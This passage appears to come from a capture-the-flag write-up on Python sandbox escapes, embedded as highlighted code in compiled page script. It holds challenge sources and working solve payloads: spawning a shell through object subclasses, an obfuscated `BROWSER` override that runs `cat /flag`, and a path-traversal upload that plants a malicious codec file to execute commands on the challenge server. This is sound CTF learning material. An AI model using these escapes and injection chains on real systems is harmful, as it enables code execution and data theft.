operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>\uFF3F\u{1D625}\u{1D630}\u{1D624}\uFF3F<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code>`,Ol,fn,Bp,Pi,Fl,mn,Go,Vo,Hi,Rl,bn,E2=`<code class="language-py"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"You get one chance to awaken from the ice prison."</span><span class="token punctuation">)</span>
code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"input: "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
whitelist <span class="token operator">=</span> <span class="token triple-quoted-string string">"""gctf&#123;"*+*(=>:/)*+*"&#125;"""</span> <span class="token comment"># not the flag</span>
<span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span><span class="token punctuation">[</span>x <span class="token keyword">not</span> <span class="token keyword">in</span> whitelist <span class="token keyword">for</span> x <span class="token keyword">in</span> code<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">40000</span><span class="token punctuation">:</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Denied!"</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'globals'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'globals'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code>`,Il,yn,$o,Jo,Ui,Dl,gn,h2=`<code class="language-py">m <span class="token operator">=</span> <span class="token triple-quoted-string string">b"""[a for a in ().__class__.__base__.__subclasses__() if 'wrapper' not in f'&#123;a.__init__&#125;'][0].__init__.__builtins__['__import__']('os').system('sh')"""</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> m<span class="token punctuation">]</span>
m <span class="token operator">=</span> m<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span>

mapping <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">"g"</span><span class="token punctuation">,</span>
    <span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">"t"</span><span class="token punctuation">,</span>
    <span class="token number">32</span><span class="token punctuation">:</span> <span class="token string">"f"</span><span class="token punctuation">,</span>
    <span class="token number">91</span><span class="token punctuation">:</span> <span class="token string">"c"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'f'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t+t+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"f+t*t*t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"f+t*t*t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"f+t*t*t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'_'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+g+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'l'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t*t*t*t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'e'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'u'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t*t*t*t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"f+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t*t*t*t+t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'t'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t*t*t*t+t+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'['</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"f+t+t+t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'m'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t*t*t*t+t+t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'h'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+g"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

payload <span class="token operator">=</span> <span class="token string">'f"&#123;(f:=(t:=(g:=+(()==()))+g)*t*t*t*t+g+g)+t*t*(t+g):c&#125;&#123;(c:=(f*t+t*t*t*t+t*t*t+t+g)):c&#125;&#123;c:c&#125;&#123;c+t+t:c&#125;'</span>
payload <span class="token operator">=</span> <span class="token string">'f"&#123;(c:=(f:=(t:=(g:=+(()==()))+g)*t*t*t*t)*t+t*t*t*t+t*t*t+t+g):c&#125;&#123;c+t+t+t:c&#125;&#123;f:c&#125;'</span>

whitelist <span class="token operator">=</span> <span class="token triple-quoted-string string">"""gctf&#123;"*+*(=>:/)*+*"&#125;"""</span>
<span class="token comment"># generate payload</span>
<span class="token keyword">for</span> c <span class="token keyword">in</span> m<span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">in</span> whitelist<span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"&#123;"</span> <span class="token keyword">or</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"&#125;"</span><span class="token punctuation">:</span>
            payload <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            payload <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
    <span class="token keyword">elif</span> c <span class="token keyword">not</span> <span class="token keyword">in</span> mapping<span class="token punctuation">:</span>
        payload <span class="token operator">+=</span> <span class="token string">"&#123;c:c&#125;"</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        payload <span class="token operator">+=</span> <span class="token string">"&#123;%s:c&#125;"</span> <span class="token operator">%</span> mapping<span class="token punctuation">[</span>c<span class="token punctuation">]</span>
payload <span class="token operator">+=</span> <span class="token string">'"'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># verify payload is the same</span></code>`,jl,wn,qp,Mi,Nl,vn,Ko,Zo,Si,Pl,En,x2=`<code class="language-py"><span class="token keyword">import</span> sys
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"This is a safe calculator"</span><span class="token punctuation">)</span>
inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Formula: "</span><span class="token punctuation">)</span>
sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

blacklist <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ."</span>
<span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>x <span class="token keyword">in</span> inp <span class="token keyword">for</span> x <span class="token keyword">in</span> blacklist<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Nice try"</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

fns <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token string">"setattr"</span><span class="token punctuation">:</span> <span class="token builtin">setattr</span><span class="token punctuation">,</span> <span class="token string">"__import__"</span><span class="token punctuation">:</span> <span class="token builtin">__import__</span><span class="token punctuation">,</span> <span class="token string">"chr"</span><span class="token punctuation">:</span> <span class="token builtin">chr</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>inp<span class="token punctuation">,</span> fns<span class="token punctuation">,</span> fns<span class="token punctuation">)</span><span class="token punctuation">)</span></code>`,Hl,hn,Xo,Qo,Bi,Ul,xn,C2=`<code class="language-py"><span class="token comment"># [setattr(__import__('os'), 'environ', &#123;'BROWSER': '/bin/sh -c "cat /flag" #%s'&#125;), __import__('antigravity')]</span>
<span class="token punctuation">[</span>\u{1D634}\u{1D626}\u{1D635}\u{1D622}\u{1D635}\u{1D635}\u{1D633}<span class="token punctuation">(</span>__\u{1D62A}\u{1D62E}\u{1D631}\u{1D630}\u{1D633}\u{1D635}__<span class="token punctuation">(</span><span class="token string">'\\157\\163'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'\\145\\156\\166\\151\\162\\157\\156'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'\\102\\122\\117\\127\\123\\105\\122'</span><span class="token punctuation">:</span><span class="token string">'\\57\\142\\151\\156\\57\\163\\150\\40\\55\\143\\40\\42\\143\\141\\164\\40\\57\\146\\154\\141\\147\\42\\40\\43\\45\\163'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> __\u{1D62A}\u{1D62E}\u{1D631}\u{1D630}\u{1D633}\u{1D635}__<span class="token punctuation">(</span><span class="token string">'\\141\\156\\164\\151\\147\\162\\141\\166\\151\\164\\171'</span><span class="token punctuation">)</span><span class="token punctuation">]</span></code>`,Ml,Cn,zp,qi,Sl,Ln,se,ne,zi,Bl,Tn,L2=`<code class="language-py"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> send_from_directory
<span class="token keyword">import</span> dis
<span class="token keyword">import</span> io
<span class="token keyword">import</span> contextlib
<span class="token keyword">import</span> os
<span class="token keyword">import</span> datetime
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'index.html'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/report/&lt;path:filename>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">serve_reports</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res <span class="token operator">=</span> send_from_directory<span class="token punctuation">(</span><span class="token string">'./reports/'</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
    <span class="token keyword">del</span> res<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span>
    res<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'text/plain'</span>
    <span class="token keyword">return</span> res

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/api/disassemble'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">disassemble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    report_name <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>filename
    source <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'./reports/'</span> <span class="token operator">+</span> report_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/report/'</span> <span class="token operator">+</span> report_name<span class="token punctuation">)</span>
    report <span class="token operator">=</span> io<span class="token punctuation">.</span>StringIO<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> contextlib<span class="token punctuation">.</span>redirect_stdout<span class="token punctuation">(</span>report<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Report for'</span><span class="token punctuation">,</span> report_name<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Report date:'</span><span class="token punctuation">,</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            code <span class="token operator">=</span> <span class="token builtin">compile</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> <span class="token string">'&lt;string>'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">)</span>
            dis<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>code<span class="token punctuation">)</span>
        <span class="token keyword">except</span> SyntaxError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Error:'</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Source code:'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./reports/'</span> <span class="token operator">+</span> report_name<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
        width <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token builtin">max</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token keyword">for</span> line <span class="token keyword">in</span> report<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&#92;n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> line <span class="token keyword">in</span> report<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&#92;n'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            line <span class="token operator">=</span> line<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>width<span class="token punctuation">)</span> <span class="token keyword">if</span> line <span class="token operator">!=</span> <span class="token string">'-'</span> <span class="token keyword">else</span> <span class="token string">'-'</span> <span class="token operator">*</span> width
            <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'# '</span> <span class="token operator">+</span> line <span class="token operator">+</span> <span class="token string">' #&#92;n'</span><span class="token punctuation">)</span>
        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>source<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/report/'</span> <span class="token operator">+</span> report_name<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">)</span></code>`,ql,An,ae,pe,Wi,zl,On,T2=`<code class="language-py"><span class="token comment"># @null</span>
<span class="token keyword">import</span> requests
<span class="token comment"># target = 'http://localhost:1337/'</span>
target <span class="token operator">=</span> <span class="token string">'http://io.ept.gg:42256/'</span>

payload <span class="token operator">=</span> <span class="token triple-quoted-string string">b'''import os
os.system('cp /flag*.txt /app/reports/flag.txt')'''</span>

<span class="token comment"># Upload payload to /usr/local/lib/python3.12/encodings/fefe.py</span>
files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'source'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'../../usr/local/lib/python3.12/encodings/fefe.py'</span><span class="token punctuation">,</span> payload<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">'/api/disassemble'</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

<span class="token comment"># When running or compiling python files that use the fefe encoding will now trigger our payload</span>
files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'source'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'fefe.py'</span><span class="token punctuation">,</span> <span class="token string">b'# encoding: fefe'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">'/api/disassemble'</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> <span class="token comment"># trigger payload</span>
<span class="token comment"># Read flag</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">'/report/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span></code>`,Wl,Fn,Wp,Yi,Yl,Rn,te,oe,Gi,Gl,In,A2=`<code class="language-py"><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span><span class="token comment">#</span>
    x <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"palindrome? "</span><span class="token punctuation">)</span><span class="token comment">#</span>
    <span class="token keyword">assert</span> <span class="token string">"#"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> x<span class="token punctuation">,</span> <span class="token string">"comments are bad"</span><span class="token comment">#</span>
    <span class="token keyword">assert</span> <span class="token builtin">all</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">128</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"ascii only kthx"</span><span class="token comment">#</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">assert</span> x <span class="token operator">==</span> x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"not a palindrome"</span><span class="token comment">#</span>
    <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token string">"palindromes can't be more than 35 characters long, this is a well known fact."</span><span class="token comment">#</span>
    <span class="token comment">#assert sum(x.encode()) % 256 == 69, "not nice!"#</span>
    <span class="token builtin">eval</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment">#)x(lave</span>
<span class="token comment">#"!ecin ton" ,96 == 652 % ))(edocne.x(mus tressa</span>
<span class="token comment">#".tcaf nwonk llew a si siht ,gnol sretcarahc 53 naht erom eb t'nac semordnilap" ,63 &lt; )x(nel tressa</span>
<span class="token comment">#"emordnilap a ton" ,]1-::[x == x tressa</span>
<span class="token comment">#"xhtk ylno iicsa" ,)x ni i rof 821 &lt; )i(dro(lla tressa</span>
<span class="token comment">#"dab era stnemmoc" ,x ni ton "#" tressa</span>
<span class="token comment">#)" ?emordnilap"(tupni = x</span>
<span class="token comment">#:eurT elihw</span></code>`,Vl,Dn,ee,ce,Vi,$l,jn,O2=`<code class="language-py"><span class="token comment"># setting up template for generating palindromes</span>
alph <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstvwyzABCDEFGHIJKLMNOPQRSTVWYZ1234567890!\\"</span><span class="token comment">#\xA4%&amp;/()=?@$\u20AC&#123;[]&#125;"</span>
dd <span class="token operator">=</span> <span class="token triple-quoted-string string">r"""'START\\',)"CHAR"=:VAR1(,',(VAR1:="CHAR"),'\\START'"""</span>
ff <span class="token operator">=</span> <span class="token triple-quoted-string string">r"""'START\\',)"CHAR"+VAR2=:VAR1(,',(VAR1:=VAR2+"CHAR"),'\\START'"""</span>
